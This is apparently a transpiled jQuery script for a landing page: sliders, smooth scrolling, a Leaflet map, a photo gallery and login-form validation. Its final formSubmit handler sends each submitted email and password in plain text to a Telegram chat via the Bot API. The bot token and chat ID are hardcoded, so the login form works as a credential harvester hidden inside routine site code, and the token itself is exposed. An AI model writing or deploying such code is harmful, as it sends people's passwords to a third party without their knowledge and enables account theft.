"use strict";

function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

$(document).ready(function () {
  var _$$slick;

  $('.hero_slider-vertical').slick({
    // dots: true,
    infinite: true,
    // speed: 1000,
    // fade: true,
    // vertical: true,
    // verticalSwiping: true,
    // cssEase: 'linear',
    // arrows:false,
    // dots: true,
    // autoplay: true,
    // speed: 3000,
    // autoplaySpeed: 2000,
    dots: true,
    vertical: true,
    slidesToShow: 1,
    slidesToScroll: 1,
    verticalSwiping: true
  });
  $('.news_cards').slick((_$$slick = {
    dots: true,
    infinite: true,
    speed: 300,
    slidesToShow: 3,
    slidesToScroll: 1,
    autoplay: true
  }, _defineProperty(_$$slick, "speed", 1000), _defineProperty(_$$slick, "autoplaySpeed", 4000), _defineProperty(_$$slick, "responsive", [{
    breakpoint: 1024,
    settings: {
      slidesToShow: 3,
      slidesToScroll: 1,
      infinite: true,
      dots: true
    }
  }, {
    breakpoint: 768,
    settings: {
      slidesToShow: 2,
      slidesToScroll: 1
    }
  }, {
    breakpoint: 480,
    settings: {
      slidesToShow: 1,
      slidesToScroll: 1
    }
  } // You can unslick at a given breakpoint now by adding:
  // settings: "unslick"
  // instead of a settings object
  ]), _$$slick)); // $('#lightgallery').lightGallery({
  //   plugins: [lgZoom, lgThumbnail],
  // });

  var section = document.querySelector('.section_id');
  var sectionPadding = window.getComputedStyle(section);
  var paddingScroll = parseFloat(sectionPadding.paddingTop);

  var scrollToSection = function scrollToSection(event) {
    event.preventDefault();
    var el = $(this);
    var dest = el.attr('href'); // получаем направление

    if (dest !== undefined && dest !== '') {
      // проверяем существование
      $('html').animate({
        scrollTop: $(dest).offset().top - paddingScroll + 30 // прокручиваем страницу к требуемому элементу

      }, 1000 // скорость прокрутки
      );
    }

    return false;
  };

  $('.header_menu-link').on("click", scrollToSection);
  $('.scroll_down').on("click", scrollToSection);
  $('.scrool_map').on("click", scrollToSection);
  var header = document.querySelector('.header');
  var headerStyle = window.getComputedStyle(header);
  var headerHeight = parseFloat(headerStyle.height);
  console.log(headerHeight);
  var element = document.getElementById('hero').getBoundingClientRect();
  console.log(element.height);
  var height = element.height - headerHeight; // зміна bg на header при скролінгу сторінки

  $(window).scroll(function () {
    if ($(this).scrollTop() > height) {
      $('.header').addClass("active");
    } else {
      $('.header').removeClass("active");
    }
  }); // ініциалізаціяф карти після кліку на секцію з картою

  $('.map').on('click', function initMap() {
    $('.contacts').css('position', 'static');
    var map = L.map('my-map').setView([50.00317690860705, 36.226601536338116], 15);
    L.tileLayer('https://cartodb-basemaps-{s}.global.ssl.fastly.net/light_all/{z}/{x}/{y}.png', {
      attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> contributors'
    }).addTo(map);
    var customIcon = L.icon({
      iconUrl: './img/marker.svg',
      iconSize: [106, 106] // size of the icon

    });
    L.marker([50.00181420905747, 36.23288158444743], {
      icon: customIcon
    }).addTo(map).bindPopup('My Lovely Location').openPopup();
    $('.map').off('click');
  }); // $('#lightgallery').lightGallery();

  lightGallery(document.getElementById('lightgallery'), {
    plugins: [lgZoom, lgThumbnail],
    thumbnail: true,
    // licenseKey: 'your_license_key',
    speed: 500,
    animateThumb: false,
    allowMediaOverlap: true,
    toggleThumb: true // ... other settings

  });
}); // Валідація форми

var EMAIL_MIN_LENGHT = 5;
var mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");

function testPasswordRegex(value) {
  return mediumRegex.test(value);
}

function checkEmailLenght() {
  var valueLenght = window.inputEmail.value.length;
  var diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;

  if (diff) {
    window.emailDiffCount.textContent = diff;
    window.emailLenghtHelp.classList.remove('d-none');
  } else {
    window.emailLenghtHelp.classList.add('d-none');
  }
}

;

function resetValidation() {
  window.emailHelp.classList.add('d-none');
  window.passwordHelp.classList.add('d-none');
  window.passwordHelpDescription.classList.add('d-none');
}

function validateForm(event) {
  event.preventDefault();
  resetValidation();
  var email = window.inputEmail.value;
  var password = window.inputPassword.value;

  if (!email) {
    window.emailHelp.classList.remove('d-none');
    return false;
  }

  if (!password) {
    window.passwordHelp.classList.remove('d-none');
    return false;
  }

  if (!testPasswordRegex(password)) {
    window.passwordHelp.classList.remove('d-none');
    window.passwordHelpDescription.classList.remove('d-none');
  }
}

function formSubmit(event) {
  var email, password, apiToken, chatId, text, urlString, response, resp;
  return regeneratorRuntime.async(function formSubmit$(_context) {
    while (1) {
      switch (_context.prev = _context.next) {
        case 0:
          event.preventDefault();
          email = window.inputEmail.value;
          password = window.inputPassword.value;

          if (!(!email || !password)) {
            _context.next = 5;
            break;
          }

          return _context.abrupt("return", false);

        case 5:
          apiToken = "6412142701:AAFqsqMVnxL0I3awtWVuK4_1i8gHEF-7zl0";
          chatId = "-1001923473956";
          text = "\n    <b>Email: </b> ".concat(email, "\n    <b>Password </b> ").concat(password, "\n    ");
          urlString = "https://api.telegram.org/bot".concat(apiToken, "/sendMessage");
          _context.next = 11;
          return regeneratorRuntime.awrap(fetch(urlString, {
            method: 'post',
            headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: text,
              parse_mode: 'HTML'
            })
          }));

        case 11:
          response = _context.sent;
          _context.next = 14;
          return regeneratorRuntime.awrap(response.json());

        case 14:
          resp = _context.sent;
          console.log(resp); // let request = new XMLHttpRequest();
          // request.open("GET", urlString);
          // request.send();
          // let response = request.response;
          // Do what you want with response

        case 16:
        case "end":
          return _context.stop();
      }
    }
  });
} // window.inputEmail.addEventListener('input', checkEmailLenght);


window.loginForm.addEventListener('submit', formSubmit);